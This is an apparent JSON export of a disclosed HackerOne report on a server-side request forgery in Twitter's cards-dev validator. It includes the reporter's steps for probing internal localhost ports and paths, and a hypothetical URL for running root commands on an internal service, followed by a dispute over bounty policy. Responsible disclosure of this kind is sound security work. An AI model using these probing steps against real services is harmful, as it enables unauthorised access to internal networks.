{"id":178184,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzgxODQ=","url":"https://hackerone.com/reports/178184","title":"SSRF in https://cards-dev.twitter.com/validator","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2016-10-26T09:48:57.900Z","submitted_at":"2016-10-26T09:48:57.900Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mindaugas","url":"/mindaugas","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-04-06T09:03:52.611Z","bug_reporter_agreed_on_going_public_at":"2017-03-07T09:03:36.539Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello, \n\nAfter my previous report (2 years ago)  https://hackerone.com/reports/30860 you fixed the vulnerability, but now it looks like this fix was reverted and the same problem exists again.\n\nTest scenario:\nOpen https://cards-dev.twitter.com/validator\n\n1. Closed port on localhost\nhttp://0.0.0.0:123 -\u003e ERROR: Fetching the page failed because other errors.\n\n2. Open port but not HTPP\nhttp://0.0.0.0:22 -\u003e ERROR: Failed to fetch page due to: ChannelClosed\n\n3. Open HTPP port\nhttp://0.0.0.0:4680\n-\u003e\nINFO:  Page fetched successfully\nINFO:  2 metatags were found\nWARN:  Not whitelisted\n\n4. Existing folder\nhttp://0.0.0.0:4680/system/\n -\u003e\nINFO:  Page fetched successfully\nINFO:  2 metatags were found\nWARN:  Not whitelisted\n\n5. None existis folder\nhttp://0.0.0.0:4680/system/\n-\u003e\nhttp://0.0.0.0:4680/test/\nINFO:  Page fetched successfully\nWARN:  No metatags found\n\nDisaster scenario:\nFind open HTTP service running on local infrastructure with ability to execute commands.\n\nFor example:\nhttp://0.0.0.0:4680/system/command.php?command=[ROOT_COMMAND]\n\n","bounty_amount":"280.0","formatted_bounty":"$280","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":130271,"file_name":"twitter.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/130/271/8a7dfb055dc9d58f90d4d80178d55fac9823f175/twitter.png?response-content-disposition=attachment%3B%20filename%3D%22twitter.png%22%3B%20filename%2A%3DUTF-8%27%27twitter.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135341Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=602a10d2651315a09f60fe2d4717d673cc1f4f64275644f41e6bb9e6333a2eb4","file_size":31799,"type":"image/png"}],"allow_singular_disclosure_at":"2017-04-06T09:03:36.579Z","allow_singular_disclosure_after":-142491005.03709924,"singular_disclosure_allowed":true,"vote_count":16,"voters":["mindaugas","vijay_kumar","mpz","muhammad_uwais","eveeez","0xradi","t4ym","linkks","alfredsaonoy","paulos_","and 6 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1268967,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your report.\n\nWe are looking into this issue and will update you when we have more information.\n\nThank you for thinking of Twitter security.","automated_response":false,"created_at":"2016-10-26T16:43:15.838Z","updated_at":"2016-10-26T16:43:15.838Z","actor":{"username":"bugtriage-jason","cleared":false,"url":"/bugtriage-jason","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1276578,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","automated_response":false,"created_at":"2016-10-31T17:34:50.401Z","updated_at":"2016-10-31T17:34:50.401Z","actor":{"username":"bfd","cleared":false,"url":"/bfd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/639/cb4711f9ee63746ad25d3c68fdef609f4ea84711_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1288428,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again. As mentioned weâ€™ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.","automated_response":false,"created_at":"2016-11-07T18:22:54.626Z","updated_at":"2016-11-07T18:22:54.626Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Twitter"}},"bounty_amount":"280.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"mindaugas","url":"/mindaugas"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1375432,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!","automated_response":false,"created_at":"2016-12-19T21:55:20.995Z","updated_at":"2016-12-19T21:55:20.995Z","actor":{"username":"bfd","cleared":false,"url":"/bfd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/639/cb4711f9ee63746ad25d3c68fdef609f4ea84711_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mindaugas","url":"/mindaugas"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1376165,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\nYes, looks like it is fixed. If i manage to bypass this fix, i will let you know.\n\nBy the way, did you check possibility to exploit this vulnerability deeper by using open ports?\nOr should i next time before reporting any vulnerability to you try to exploit it as much as possible and only then report it to you, because on that depends the amount of bounty.\n\nI'm asking cause, your bounty policy is not totally clear for me. And the fact that first time the bounty was 420 and this time 280 for exactly the same vulnerability. I'm glad to to have ability to participate in your BB program and i'm satisfied with the amount, but a little clearance would be great :)","automated_response":false,"created_at":"2016-12-20T07:25:23.406Z","updated_at":"2016-12-20T07:25:23.406Z","actor":{"username":"mindaugas","cleared":false,"url":"/mindaugas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1377791,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"Upon further investigation we've found a few additional areas we'd like to correct before closing out this report. We'll let you know once we consider these items to be complete.\n\nThanks for thinking of Twitter Security!","automated_response":false,"created_at":"2016-12-20T20:03:47.011Z","updated_at":"2016-12-20T20:04:31.061Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1377797,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2016-12-20T20:04:36.440Z","updated_at":"2016-12-20T20:04:36.440Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1409667,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now.\n\nThank you for helping keep Twitter secure!","automated_response":false,"created_at":"2017-01-09T21:40:00.752Z","updated_at":"2017-01-09T21:40:00.752Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mindaugas","url":"/mindaugas"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1410424,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, looks like it's fixed.\n\nAnd what about my questions? A bit clearance of your bug bounty policy would motivate me to keep Twitter secure in the feature.","automated_response":false,"created_at":"2017-01-10T05:31:46.949Z","updated_at":"2017-01-10T05:31:46.949Z","actor":{"username":"mindaugas","cleared":false,"url":"/mindaugas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1453592,"is_internal":false,"editable":false,"type":"Activities::HackerRequestedMediation","message":"Hello,\n\nI invest my time keeping Twitter secure and i hope to get few minutes attention from Twitter by clearing some things about their bug bounty program policy. I was patient and polite, but now i'm disappointed with Twitter's total ignorance.\n\nMy question was (it does not include any details of the vulnerability):\n\n\"By the way, did you check possibility to exploit this vulnerability deeper by using open ports?\nOr should i next time before reporting any vulnerability to you try to exploit it as much as possible and only then report it to you, because on that depends the amount of bounty.\n\nI'm asking cause, your bounty policy is not totally clear for me. And the fact that first time the bounty was 420 and this time 280 for exactly the same vulnerability. I'm glad to to have ability to participate in your BB program and i'm satisfied with the amount, but a little clearance would be great :)\"\n\nHackerOne, what is your opinion about the Twitter's decision to value SSRF vulnerability same as \"All other Cross Site Request Forgery\" (lowest vulnerabilities category in their bug bounty program)?","automated_response":false,"created_at":"2017-01-31T08:59:14.123Z","updated_at":"2017-01-31T08:59:14.123Z","actor":{"username":"mindaugas","cleared":false,"url":"/mindaugas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1457427,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi mindaugas,\n\nSorry for the delay in responding to your report. We reward reports primarily based on the impact of the vulnerability and completeness of the report. It is not appropriate to assume that an issue was rewarded as CSRF based on the amount, as there are many other vulnerability classes that are not enumerated on the rules page. We'll take another look at this report again on Friday and determine if an additional bounty is warranted.\n\nThanks for thinking of Twitter security!","automated_response":false,"created_at":"2017-02-01T23:28:45.574Z","updated_at":"2017-02-01T23:28:45.574Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1457868,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"In this case the impact depended on reachable hosts with open ports and services running on it. I stopped my research when i found out that i can reach your internal network. Any further steps of research could be against law. So, i will ask this question third time :)\n\nDid you check the possibility to exploit this vulnerability deeper by using open ports?\nOr should i next time before reporting any vulnerability to you try to exploit it as much as possible and only then report it to you?","automated_response":false,"created_at":"2017-02-02T06:47:36.071Z","updated_at":"2017-02-02T06:47:36.071Z","actor":{"username":"mindaugas","cleared":false,"url":"/mindaugas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1496161,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n19 days and two Fridays have passed from our last conversation. Any updates?\n","automated_response":false,"created_at":"2017-02-21T06:54:48.854Z","updated_at":"2017-02-21T06:54:48.854Z","actor":{"username":"mindaugas","cleared":false,"url":"/mindaugas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1510677,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n26 days have passed from our last conversation. Any updates?","automated_response":false,"created_at":"2017-02-28T10:42:36.947Z","updated_at":"2017-02-28T10:42:36.947Z","actor":{"username":"mindaugas","cleared":false,"url":"/mindaugas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1523790,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For me bug bounty programs are not about the money - i earn enough at my job. \nI want to believe that bug bounty programs is all about sharing knowledge and and using it for good cause - keeping the internet safe. But all relationships (in this case between the company ant whitehat hackers) is about respect.\n\nIgnorance is not a part of respect.","automated_response":false,"created_at":"2017-03-07T09:03:22.222Z","updated_at":"2017-03-07T09:03:22.222Z","actor":{"username":"mindaugas","cleared":false,"url":"/mindaugas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1523791,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-03-07T09:03:36.557Z","updated_at":"2017-03-07T09:03:36.557Z","first_to_agree":true,"actor":{"username":"mindaugas","cleared":false,"url":"/mindaugas","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1527834,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi mindaugas,\n\nAs previously mentioned our bounties are determined based on impact and completeness of the report. In order to determine the impact of an issue we will review the report and consider the impact that the vulnerability has based on other internal factors, such as other security controls. As a reporter, in some cases it can be helpful to further investigate an issue to determine impact, however this must be done with care to avoid violating the program rules.\n\nOn a final note, notifications for new comments on closed out reports is not something we have good visibility once a report has been closed for more than a few days. If you feel that a report needs additional attention, please request mediation through HackerOne support - we will be notified at that time and can ensure your question is addressed.\n\nThanks for thinking of Twitter security!","automated_response":false,"created_at":"2017-03-08T19:03:46.102Z","updated_at":"2017-03-08T19:03:46.102Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1586629,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-04-06T09:03:52.642Z","updated_at":"2017-04-06T09:03:52.642Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Twitter"}},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}